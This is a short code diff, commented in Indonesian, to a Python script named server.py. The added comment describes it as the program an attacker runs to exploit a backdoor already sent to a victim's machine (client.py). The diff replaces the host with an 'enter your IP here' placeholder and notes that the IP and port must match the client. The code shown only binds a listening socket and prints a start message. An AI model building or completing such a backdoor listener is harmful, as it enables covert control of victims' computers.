@@ -1,7 +1,8 @@
+#server.py adalah sebuah source code yang kamu jalankan untuk mengexploitasi hasil backdoor yang tadi sudah dikirimkan ke korban(client.py) 
 import socket
 
-HOST = '127.0.0.1' # '192.168.43.82'
-PORT = 8081 # 2222
+HOST = 'taruh ip anda disini' # '192.168.43.82' # ip harus sama dengan (client.py)
+PORT = 8081 # 2222 # port harus sama dengan (client.py)
 server = socket.socket()
 server.bind((HOST, PORT))
 print('[+] Server Started')
